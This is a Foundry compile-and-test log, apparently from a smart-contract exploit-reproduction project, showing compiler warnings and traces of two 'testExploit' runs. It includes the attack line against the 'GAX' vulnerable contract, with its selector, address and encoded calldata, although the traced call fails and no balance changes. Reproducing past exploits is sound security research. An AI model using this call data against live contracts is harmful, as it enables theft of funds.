Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.16s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (9302): Return value of low-level calls not used.
  --> src/test/2024-07/GAX_exp.sol:28:9:
   |
28 |         VulnContract_addr.call(abi.encodeWithSelector(bytes4(0x6c99d7c8), data));
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 285.89ms (1.30ms CPU time)

Ran 1 test for src/test/2024-07/GAX_exp.sol:ContractTest
[PASS] testExploit() (gas: 1056947666)
Logs:
  Attacker BUSD balance before attack: 26.542161622221038197
  Attacker BUSD balance after attack: 26.542161622221038197

Traces:
  [1056947666] ContractTest::testExploit()
    ├─ [2531] BUSD::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26542161622221038197 [2.654e19]
    ├─ emit log_named_decimal_uint(key: "Attacker BUSD balance before attack", val: 26542161622221038197 [2.654e19], decimals: 18)
    ├─ [2531] BUSD::balanceOf(VulnContract: [0xdb4b73Df2F6dE4AFCd3A883efE8b7a4B0763822b]) [staticcall]
    │   └─ ← [Return] 49583844000000000000000 [4.958e22]
    ├─ [39] VulnContract::6c99d7c8(000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a7ff210d3890fca00000000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [NotActivated] EvmError: NotActivated
    ├─ [531] BUSD::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26542161622221038197 [2.654e19]
    ├─ emit log_named_decimal_uint(key: "Attacker BUSD balance after attack", val: 26542161622221038197 [2.654e19], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 911.23ms (251.00ms CPU time)

Ran 2 test suites in 1.23s (1.20s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
